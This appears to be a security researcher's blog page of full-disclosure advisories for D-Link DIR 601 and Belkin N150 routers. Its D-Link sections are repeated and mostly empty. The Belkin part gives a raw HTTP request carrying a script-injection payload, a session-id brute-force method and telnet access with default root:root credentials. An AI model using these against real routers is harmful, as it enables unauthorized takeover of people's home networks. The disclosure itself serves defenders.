## FULL DISCLOSURE

#Product : Dlink DIR 601 Router

#Exploit Author : Rahul Pratap Singh

#Home page Link : <https://www.dlink.com/>

#Harware Version : B1

#Firmware Version : 2.00NA

#Date : 24/12/2019

#CVE-ID: CVE-2019-16327, CVE-2019-16326

1. Authentication Bypass Vulnerability:

—————————————-

Description:

—————————————-

—————————————-

Exploit and POC:

—————————————-

2. CSRF Vulnerability:

—————————————-

Description:

—————————————-

—————————————-

Exploit and POC:

[December 24, 2019December 27, 2019](https://0x62626262.wordpress.com/2019/12/24/dlink-dir-601-router-authentication-bypass-and-csrf/) / [Rahul Pratap Singh](https://0x62626262.wordpress.com/author/nopnoppwn/)  / [2 Comments](https://0x62626262.wordpress.com/2019/12/24/dlink-dir-601-router-authentication-bypass-and-csrf/#comments)

![Full Disclosure](https://0x62626262.wordpress.com/wp-content/uploads/2019/12/dlink-dir-601-authentication-bypass-and-csrf-vulnerability.jpeg?w=676)

## FULL DISCLOSURE

#Product : Dlink DIR 601 Router

#Exploit Author : Rahul Pratap Singh

#Home page Link : <https://www.dlink.com/>

#CVE-ID: CVE-2019-16327, CVE-2019-16326

1. Authentication Bypass Vulnerability:

—————————————-

Exploit and POC:

—————————————-

2. CSRF Vulnerability:

—————————————-

Description:

—————————————-

# [Belkin N150 Router Multiple Vulnerabilities](https://0x62626262.wordpress.com/2015/11/30/belkin-n150-router-multiple-vulnerabilities/)

[November 30, 2015November 30, 2015](https://0x62626262.wordpress.com/2015/11/30/belkin-n150-router-multiple-vulnerabilities/) / [Rahul Pratap Singh](https://0x62626262.wordpress.com/author/nopnoppwn/)  / [7 Comments](https://0x62626262.wordpress.com/2015/11/30/belkin-n150-router-multiple-vulnerabilities/#comments)

Full Disclosure:

Recently, I encountered some vulnerabilities in Belkin N150 Router. Reported it to the vendor and haven’t  got any reply from Belkin Security Team.

→ Vulnerability/BUG Report :

1)

• Vulnerability Title : HTML/Script Injection

• Browser : Firefox 41

• OS : Ubuntu 14.04

• Vulnerable : Belkin N150 Wireless Home Network Router

• Version : F9K1009 v1

• Firmware : 1.00.09

→ Proof of Concept:

“InternetGatewayDevice.DeviceInfo.X\_TWSZ-COM\_Language” this parameter is vulnerable.

![1_vul_code](https://0x62626262.wordpress.com/wp-content/uploads/2015/11/1_vul_code.png?w=676)→ Steps to Reproduce:

Send the following post request using Burpsuite,etc

POST /cgi-bin/webproc HTTP/1.1

Host: 192.168.2.1

User-Agent: Mozilla/5.0 (Windows NT 6.2; rv:35.0) Gecko/20100101 Firefox/35.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,\*/\*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

DNT: 1

Referer: <http://192.168.2.1/cgi-bin/webproc?getpage=html/page.html&var:page=deviceinfo&var:oldpage=->

Cookie: sessionid=7cf2e9c5; auth=ok; expires=Sun, 15-May-2102 01:45:46 GMT

Connection: keep-alive

Content-Type: application/x-www-form-urlencoded

Content-Length: 260

%3AInternetGatewayDevice.DeviceInfo.X\_TWSZ-COM\_Language=”>alert(“1”)<script>”&obj-action=set&var%3Apage=deviceinfo&var%3Aerrorpage=deviceinfo&

getpage=html%2Findex.html&errorpage=html%2Findex.html&

var%3ACacheLastData=U1BBTl9UaW1lTnVtMT0%3D

2)

• Vulnerability Title : Session Hijacking

• Browser : Firefox 41

• OS : Ubuntu 14.04

• Vulnerable : Belkin N150 Wireless Home Network Router

• Version : F9K1009 v1

• Firmware : 1.00.09

→ Proof of Concept:

Cookie: sessionid=7cf2e9c5; auth=ok; expires=Sun, 15-May-2102 01:45:46 GMT

sessionid is allocated using hex encoding and of fixed length i.e 8 . Therefore, it is very easy to bruteforce it in feasible amount for time as this session id ranges from 00000000 to ffffffff

→ Steps to Reproduce:

Send the following request using Burpsuite and Bruteforce the sessionid.

POST /cgi-bin/webproc HTTP/1.1

Host: 192.168.2.1

User-Agent: Mozilla/5.0 (Windows NT 6.2; rv:35.0) Gecko/20100101 Firefox/35.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,\*/\*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

DNT: 1

Referer: <http://192.168.2.1/cgi-bin/webproc?getpage=html/page.html&var:page=deviceinfo&var:oldpage=->

Cookie: sessionid=7cf2e9c5; auth=ok; expires=Sun, 15-May-2102 01:45:46 GMT

3)

• Vulnerability Title : Telnet Enabled with Default Pass

• Browser : Firefox 41

• OS : Ubuntu 14.04

• Vulnerable : Belkin N150 Wireless Home Network Router

• Version : F9K1009 v1

• Firmware : 1.00.09

→ Vulnerability Details:

Telnet protocol can be used by an attacker to gain remote access to the router with root privileges.

→ Proof of Concept:

![3_telnet](https://0x62626262.wordpress.com/wp-content/uploads/2015/11/3_telnet.png?w=676)

→ Steps to Reproduce:

1) Open terminal

2) Type following command:

telnet 192.168.2.1

3) Default user and pass is root:root

4)

• Vulnerability Title : Cross Site Request Forgery

• Browser : Firefox 41

• OS : Ubuntu 14.04

• Vulnerable : Belkin N150 Wireless Home Network Router

• Version : F9K1009 v1

• Firmware : 1.00.09

→ Proof of Concept:

Request doesn’t contain any CSRF-token. Therefore, requests can be forged. It can be verified with any request.

# DLink DIR 601 Router – Authentication Bypass and CSRF

[December 24, 2019December 27, 2019](https://0x62626262.wordpress.com/2019/12/24/dlink-dir-601-router-authentication-bypass-and-csrf/) / [Rahul Pratap Singh](https://0x62626262.wordpress.com/author/nopnoppwn/)

![Full Disclosure](https://0x62626262.wordpress.com/wp-content/uploads/2019/12/dlink-dir-601-authentication-bypass-and-csrf-vulnerability.jpeg?w=676)

## FULL DISCLOSURE

#Product : Dlink DIR 601 Router

#Exploit Author : Rahul Pratap Singh

#Home page Link : <https://www.dlink.com/>

#Harware Version : B1

#Firmware Version : 2.00NA

#Date : 24/12/2019

#CVE-ID: CVE-2019-16327, CVE-2019-16326

1. Authentication Bypass Vulnerability:

—————————————-

Description:

—————————————-

Router relies on the client side protection for authentication and does not validate on the server side. Consequently, it could be easily bypassed, allowing users to perform any operation without authentication.

—————————————-

Exploit and POC:

—————————————-

2. CSRF Vulnerability:

—————————————-

Description:

—————————————-

Router does not implement any CSRF protection. Since, the router is also vulnerable to authentication bypass vulnerability, it could be chained to exploit the vulnerability remotely.

—————————————-

Exploit and POC:

—————————————-

Fix:

No fix at the time of disclosure. Since, the product has reached EOL and no longer supported, it is suggested not to use it, and use the latest router models.
